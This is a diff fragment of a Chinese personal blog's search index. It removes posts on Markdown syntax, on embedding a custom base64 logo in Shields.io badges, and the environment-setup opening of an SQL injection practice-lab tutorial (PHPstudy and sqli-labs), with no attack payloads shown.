-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">跳转的终点（锚）：同html,见下</span><br><span class="line">跳转的起点（链接）：[显示的内容](#id)</span><br><span class="line">可以理解为跳转终点（锚）定义了一个名为id的元素，而跳转起点则是一个指向该元素的链接</span><br><span class="line">例如：文章第一句话的写法：&lt;a id="1"&gt;此篇博客是进阶教程&lt;/a&gt;，下面一行是跳转起点：[跳转至开头](#1)</span><br></pre></td></tr></tbody></table></figure>
-
-<p><a href="#1">跳转至开头</a> ←点击此处查看效果<br><strong>注：id这里建议写英文或数字，不要写中文，可能会出错</strong></p>
-</li>
-<li><p>HTML写法：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">跳转终点：&lt;a id="xxx"&gt;显示的内容&lt;/a&gt;</span><br><span class="line">跳转起点：&lt;a href="#xxx"&gt;显示的内容&lt;/a&gt;</span><br><span class="line">除了a标签外，用p,div,span等标签也有效（将a改成p,div或span）</span><br><span class="line">例如：文章第一句话的写法：&lt;a id="1"&gt;此篇博客是进阶教程&lt;/a&gt;，下面一行是跳转起点：&lt;a href="#1"&gt;跳转至开头&lt;/a&gt;</span><br></pre></td></tr></tbody></table></figure>
-
-<p><a href="#1">跳转至开头</a>←点击此处查看效果<br><strong>注：若要跳转到零一页面的锚，在终点的<code>#xxx</code>之前添加文件名（如1.html）即可</strong></p>
-</li>
-</ol>
-</div><div class="story post-story"><h2 id="To-do-list（任务列表）"><a href="#To-do-list（任务列表）" class="headerlink" title="To-do list（任务列表）"></a>To-do list（任务列表）</h2><ul>
-<li>未完成：<code>- [ ] </code>		短横+空格+左方括号+空格+右方括号+空格</li>
-<li>已完成：<code>-[x] </code>		短横加空格+左方括号+字母x+右方括号+空格</li>
-</ul>
-<p><strong>注意-和[]中间一定要加空格、后面爷要加空格，未完成的写法[]中间有空格</strong></p>
-<p>举例：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">- [ ] 学习</span><br><span class="line">- [x] 打游戏</span><br><span class="line">- [x] 看电影</span><br></pre></td></tr></tbody></table></figure>
-
-<p>效果：</p>
-<ul>
-<li><input disabled="" type="checkbox"> 学习</li>
-<li><input checked="" disabled="" type="checkbox"> 打游戏</li>
-<li><input checked="" disabled="" type="checkbox"> 看电影</li>
-</ul>
-</div><div class="story post-story"><h2 id="脚注"><a href="#脚注" class="headerlink" title="脚注"></a>脚注</h2><p><strong>由于本站源代码问题，脚注没有被很好地显示出来！</strong></p>
-<p>如果有参考文献或文章之类的话应该要用的<br>正文中脚注的编号用<code>[^1],[^2],[^3]</code>等，尾部注释对应用<code>[^1]: 注释内容</code>，<code>[^2]: 注释内容</code> ，<code>[^3]: 注释内容</code>等<br>脚注编号显示在文字右上角，鼠标移上去会显示注释内容</p>
-<p>举例：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">他[^1]</span><br><span class="line">文末处：[^1]: 黑框眼镜</span><br></pre></td></tr></tbody></table></figure>
-
-<p>正文效果：他<a href="%E9%BB%91%E6%A1%86%E7%9C%BC%E9%95%9C">^1</a>（注释在文末）</p>
-</div><div class="story post-story"><h2 id="Unicode特殊字符-emoji"><a href="#Unicode特殊字符-emoji" class="headerlink" title="Unicode特殊字符(emoji)"></a>Unicode特殊字符(emoji)</h2><p>格式为<code>&amp;#数字;</code>，其实是HTML<br>举例：<code>&amp;#937;</code>为Ω，<code>&amp;#952;</code>为θ。</p>
-<p>unicode字符包含的内容非常之多，最典型的还属emoji。如<code>&amp;#128517;</code>😅<code>&amp;#129299;</code>🤓</p>
-<p><a href="https://unicode-table.com/cn/">这里是unicode的参考网址</a></p>
-</div><div class="story post-story"><h2 id="支持HTML的典型例子"><a href="#支持HTML的典型例子" class="headerlink" title="支持HTML的典型例子"></a>支持HTML的典型例子</h2><h3 id="音频"><a href="#音频" class="headerlink" title="音频"></a>音频</h3><p>html5语法：</p>
-<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">"音频文件路径"</span>&gt;</span></span><br><span class="line">不能播放时的报错信息</span><br><span class="line"><span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
-
-<p>举例：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;audio src="audio.mp3"&gt;</span><br><span class="line">您的浏览器不支持播放该音频</span><br><span class="line">&lt;/audio&gt;</span><br></pre></td></tr></tbody></table></figure>
-
-
-
-<h3 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h3><p>同为html5语法：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;video src="视频文件路径"&gt;</span><br><span class="line">不能播放时的报错信息</span><br><span class="line">&lt;/video&gt;</span><br></pre></td></tr></tbody></table></figure>
-
-<p>举例：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;video src="video.mp4"&gt;</span><br><span class="line">您的浏览器不支持播放该音频</span><br><span class="line">&lt;/video&gt;</span><br></pre></td></tr></tbody></table></figure>
-
-
-
-<h3 id="改变字体颜色和大小"><a href="#改变字体颜色和大小" class="headerlink" title="改变字体颜色和大小"></a>改变字体颜色和大小</h3><p>语法:</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;font  color=#00ffff size=7 face="纯书法字体"&gt;青色7号纯书法字体&lt;/font&gt;</span><br><span class="line">或者</span><br><span class="line">&lt;font color=cyan size=7 face="纯书法字体"&gt;或者可以这么写&lt;/font&gt;</span><br></pre></td></tr></tbody></table></figure>
-
-<p>显示效果:</p>
-<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="one"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/12/62a53bbcebedc.png" data-fancybox="one" data-caption="undefined"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/12/62a53bbcebedc.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/12/62a53bbcebedc.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div>
-
-
-
-
-</div><div class="story post-story"><h2 id="Markdown制图-2"><a href="#Markdown制图-2" class="headerlink" title="Markdown制图^2"></a>Markdown制图<a href="%E5%8F%82%E8%80%83%3Chttps://blog.csdn.net/adorable_/article/details/117780977">^2</a></h2><p>Markdown可以绘制很多图,如时序图、甘特图、mermaid流程图、flow流程图等。<br>这里主要介绍flow流程图。其他的图可以参考这篇CSDN博客：<a href="https://blog.csdn.net/qq_14920635/article/details/109033143?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164993699816780264064499%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=164993699816780264064499&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-1-109033143.142%5Ev8%5Epc_search_result_cache,157%5Ev4%5Econtrol&amp;utm_term=markdown%E7%BB%98%E5%9B%BE&amp;spm=1018.2226.3001.4187">点击跳转</a><br>首先，用一对3个`包裹代码块并在第一处后输入flow，确定这一段代码用flow来编写<br>然后就是绘制流程图的步骤。绘制流程图可以分为两步：</p>
-<ol>
-<li>定义元素（框框和里面的内容）：<br> <code>元素名称=&gt;元素类型: 显示的内容:&gt;超链接URL</code>(:&gt;URL可以不要)<br> <strong>注意：<code>=&gt;</code>后不能有空格， <code>:</code>后需要有空格</strong><br> 元素类型有6种，分别为：</li>
-</ol>
-<ul>
-<li><p>开始（椭圆形）：start</p>
-</li>
-<li><p>结束（椭圆形）：end</p>
-</li>
-<li><p>子程序（长得像圣旨诏书）：subroutine</p>
-</li>
-<li><p>操作（矩形）：operation</p>
-</li>
-<li><p>条件判断（菱形）：condition</p>
-</li>
-<li><p>输入输出（平行四边形）：inputoutput</p>
-</li>
-</ul>
-<ol start="2">
-<li>关联元素<br> 用 <code>-&gt;</code> 来关两个节点<br> 如果是 condition 节点将会有 yes/true 和 no/false 两个分支<br> left/right表示连线出口在节点位置（默认下面是出口，如con2），也可以跟condition变量一起用，如：con1(yes,right)</li>
-</ol>
-<p>举例：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">```flow</span><br><span class="line">start=&gt;start: 开始</span><br><span class="line">end=&gt;end: 结束</span><br><span class="line">in=&gt;inputoutput: 输入年份n</span><br><span class="line">con1=&gt;condition: n能否被4整除？</span><br><span class="line">con2=&gt;condition: n能被100整除？</span><br><span class="line">con3=&gt;condition: n能被400整除？</span><br><span class="line">out1=&gt;inputoutput: 输出闰年</span><br><span class="line">out2=&gt;inputoutput: 输出非闰年</span><br><span class="line"></span><br><span class="line">start(right)-&gt;in-&gt;con1(yes,right)-&gt;con2(yes)-&gt;con3(yes)-&gt;out1-&gt;end</span><br><span class="line">con1(no)-&gt;con2-&gt;end</span><br><span class="line">con2(no,right)-&gt;out1</span><br><span class="line">con3(no)-&gt;out2</span><br><span class="line">```</span><br></pre></td></tr></tbody></table></figure>
-
-<p>效果：</p>
-<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="one"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/12/62a53bbdd95cc.png" data-fancybox="one" data-caption="flow流程图"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/12/62a53bbdd95cc.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/12/62a53bbdd95cc.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="flow流程图"></a><span class="image-caption">flow流程图</span></div></div>
-
-
-
-
-
-</div><div class="story post-story"><h2 id="数学公式"><a href="#数学公式" class="headerlink" title="数学公式"></a>数学公式</h2><p>原生的Markdown是不支持LaTex的，但如果用Typora则支持LaTex预览<br>最后的显示效果取决于用什么软件编译和导出</p>
-</div><div class="story post-story"><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本博客名为教程，实则是个人学习Markdown的一些学习经验分享，不保证完全正确和详尽。欢迎指正错误，也欢迎留言分享哦！</p>
-<p>今日一言：</p>
-<blockquote>
-<p>我选择沉默的主要原因之一：从话语中，你很少能学到人性，从沉默中却能。假如还想学得更多，那就要继续一声不吭 。</p>
-<p>—— 王小波</p>
-</blockquote>
-
-</div>]]></content>
-      <categories>
-        <category>前端</category>
-      </categories>
-      <tags>
-        <tag>Markdown</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Shields.io使用之添加自定义图标</title>
-    <url>/posts/shield/</url>
-    <content><![CDATA[<div class="story post-story"><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p><a href="https://shields.io/">Shields.io</a>是一个为我们提供自定义徽章的文章。<span id="more"></span>在GitHub的很多仓库我们都能见到像<img no-lazy="" class="inline" src="/img/volantis.svg" style="height:1.5em">这样的徽章，它们绝大多数都使用<a href="https://shields.io/">Shields.io</a>制作。但是我们在使用logo时，由于其logo库使用<a href="https://simpleicons.org/">Simple Icons</a>，所以只有国际知名的品牌logo能在上面找到。那么，当我们想要使用自己定义的logo时，就不能仅凭<code>logo=xxx</code>这样简单的代码实现了。</p>
-</div><div class="story post-story"><h2 id="官网描述"><a href="#官网描述" class="headerlink" title="官网描述"></a>官网描述</h2><div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="one"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/13/62a75e74543bc.png" data-fancybox="one" data-caption="desc"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/13/62a75e74543bc.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/13/62a75e74543bc.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="desc"></a><span class="image-caption">desc</span></div></div>
-<p>查看官网我们得到这样的信息。发现<a href="https://shields.io/">Shields.io</a>其实是允许我们插入自定义logo图片的，但是要求是高度大于等于14px且http的请求头不能超过8192字节。只要知道文件Base64编码的DataURL形式就可以了。</p>
-</div><div class="story post-story"><h2 id="图片准备"><a href="#图片准备" class="headerlink" title="图片准备"></a>图片准备</h2><h3 id="裁剪压缩图片"><a href="#裁剪压缩图片" class="headerlink" title="裁剪压缩图片"></a>裁剪压缩图片</h3><p>使用png格式图片进行裁剪压缩，我直接用的在线工具：</p>
-<div class="tag link"><a class="link-card" title="I❤IMG" href="https://www.iloveimg.com/zh-cn/compress-image"><div class="left"><img src="https://www.iloveimg.com/img/favicons-img/favicon-16x16.png" class="lazyload" data-srcset="https://www.iloveimg.com/img/favicons-img/favicon-16x16.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></div><div class="right"><p class="text">I❤IMG</p><p class="url">https://www.iloveimg.com/zh-cn/compress-image</p></div></a></div>
-
-<p>建议将图片裁剪压缩到5k左右，这样能使http请求头尽量小。<del>况且徽章小，图片文件小些没关系</del></p>
-<h3 id="获取图片Base64编码的DataURL形式"><a href="#获取图片Base64编码的DataURL形式" class="headerlink" title="获取图片Base64编码的DataURL形式"></a>获取图片Base64编码的DataURL形式</h3><p>推荐大佬做的工具</p>
-<div class="tag link"><a class="link-card" title="Base64在线解码编码" href="https://base64.us/"><div class="left"><img src="https://base64.us/favicon.png" class="lazyload" data-srcset="https://base64.us/favicon.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></div><div class="right"><p class="text">Base64在线解码编码</p><p class="url">https://base64.us/</p></div></a></div>
-
-<p>如下图，选择你的logo图片（png格式）</p>
-<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="one"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/13/62a75e7e49dc8.png" data-fancybox="one" data-caption="undefined"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/13/62a75e7e49dc8.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/13/62a75e7e49dc8.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div>
-<p>将这一串字符全选复制。</p>
-<h3 id="拼接至URL中"><a href="#拼接至URL中" class="headerlink" title="拼接至URL中"></a>拼接至URL中</h3><p>格式为：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">https://img.shields.io/badge/左边文字-右边文字-右边颜色?logo=data:image/png;base64,刚刚复制的那串字符</span><br></pre></td></tr></tbody></table></figure>
-
-
-
-<p>比如我的页脚Copyright徽章，URL为</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">https://img.shields.io/badge/Copyright%402022-Bowen%20Young-%23EF9421?logo=data:image/png;base64,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</span><br></pre></td></tr></tbody></table></figure>
-
-<p>效果为：<img no-lazy="" class="inline" src="/img/copyright.svg" style="height:1.5em"></p>
-</div><div class="story post-story"><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>上文<code>data:image/png;base64,…</code>这种形式被称为<strong>Data URL Scheme</strong>。</p>
-<p><strong>Data URL Scheme</strong>的作用，一般就是将经过Base64编码的数据嵌入网页中，从而减少请求资源的链接数。 上面的<strong>Data URL Scheme</strong>中 base64, 后的字符就是经过base64编码后的数据，浏览器会对其解码并渲染该图片资源。</p>
-
-</div>]]></content>
-      <categories>
-        <category>前端</category>
-      </categories>
-      <tags>
-        <tag>shields</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>记录第一次参与美漫翻译</title>
     <url>/posts/sp-translate/</url>
     <content><![CDATA[<p>有点小兴奋。我终于也成了一名”烤肉man”。以前看美剧、美漫的时候片头字幕组给我的感觉就是：帅爆了。试想一下，你将自己喜欢看的剧翻译成中文，你的同好看的某一集就是你翻译的——SO DAMN COOL!<span id="more"></span></p>
@@ -933,46 +777,6 @@
       </categories>
       <tags>
         <tag>hexo</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SQL注入新手教程（一）——sqli-labs靶场搭建</title>
-    <url>/posts/sqli1/</url>
-    <content><![CDATA[<div class="story post-story"><h2 id="网站环境搭建"><a href="#网站环境搭建" class="headerlink" title="网站环境搭建"></a>网站环境搭建</h2><p>首先我们要搭建一个（本地）网站环境，如果对搭建网站不是很熟悉的小伙伴们可以使用XAMPP或者PHPstudy来搭建。<span id="more"></span>这两个软件集成了搭建网站所需要用到的PHP、Apache、MySQL等软件。如果自己用其他方式搭建的话要注意sqli-labs是不支持PHP7的，因为之前版本的一些要用到的函数在PHP7中被删除了。我用的是5.6.9版本。<br>这里我就用PHPstudy为例（听名字就知道使用起来更简单）:</p>
-<p>首先确保没有安装过PHP，Apache或MySQL</p>
-<p>前往官网下载PHPstudy：<a href="https://www.xp.cn/">https://www.xp.cn/</a></p>
-<p>下载完成后安装，打开面板。</p>
-<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="one"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/12/62a53def80f09.png" data-fancybox="one" data-caption="1-1"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/12/62a53def80f09.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/12/62a53def80f09.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="1-1"></a><span class="image-caption">1-1</span></div></div>
-<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="one"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/12/62a53ded29649.jpg" data-fancybox="one" data-caption="1-2"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/12/62a53ded29649.jpg" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/12/62a53ded29649.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="1-2"></a><span class="image-caption">1-2</span></div></div>
-<p>如图示操作，第一次打开应该点击更多版本，找到php5.6.9或者更低的版本安装。并将php版本切换成你安装的那个版本。接下来回到首页，按图操作：</p>
-<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="one"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/12/62a53df038fa1.png" data-fancybox="one" data-caption="1-3"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/12/62a53df038fa1.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/12/62a53df038fa1.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="1-3"></a><span class="image-caption">1-3</span></div></div>
-<p>将WAMP、Apache和MySQL启动，其他的停止。这里可能会遇到端口被占用的情况导致某个套件无法启动。遇到这个问题可以去找占用了改端口的进程并将其停止。Windows用户可以参考这篇文章：<a href="https://www.runoob.com/w3cnote/windows-finds-port-usage.html">链接</a></p>
-<p>如果上述过程都顺利完成，接下来在你的浏览器输入localhost或127.0.0.1就可以进入默认网页。这时就代表网站环境已经搭建成功了！<del>芜湖！</del></p>
-</div><div class="story post-story"><h2 id="sqli-labs下载与配置"><a href="#sqli-labs下载与配置" class="headerlink" title="sqli-labs下载与配置"></a>sqli-labs下载与配置</h2><p>sqli-labs在GitHub上开源，直接到仓库里下载zip文件：<a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p>
-<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="one"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/12/62a53df0d2646.png" data-fancybox="one" data-caption="2-1"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/12/62a53df0d2646.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/12/62a53df0d2646.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="2-1"></a><span class="image-caption">2-1</span></div></div>
-<p>下载完成后解压并复制到<code>phpstudy_pro\www\</code>目录下</p>
-<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="one"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/12/62a53df1584e7.png" data-fancybox="one" data-caption="2-2"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/12/62a53df1584e7.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/12/62a53df1584e7.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="2-2"></a><span class="image-caption">2-2</span></div></div>
-<p>我这里将解压好的文件夹重命名为<code>sqli</code>方便我之后打开。<br><strong>注意：要确保你复制过来的文件夹打开是下图这样，如果打开是一个同名的文件夹，你应该把图中内容剪切出来并删除这个同名的文件夹</strong></p>
-<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="one"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/12/62a53df1de40d.png" data-fancybox="one" data-caption="2-3"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/12/62a53df1de40d.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/12/62a53df1de40d.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="2-3"></a><span class="image-caption">2-3</span></div></div>
-<p>接着在<code>sql-connections</code>目录下找到<code>db-creds.inc</code>文件并打开修改</p>
-<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="one"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/12/62a53df27d2c7.png" data-fancybox="one" data-caption="2-4"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/12/62a53df27d2c7.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/12/62a53df27d2c7.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="2-4"></a><span class="image-caption">2-4</span></div></div>
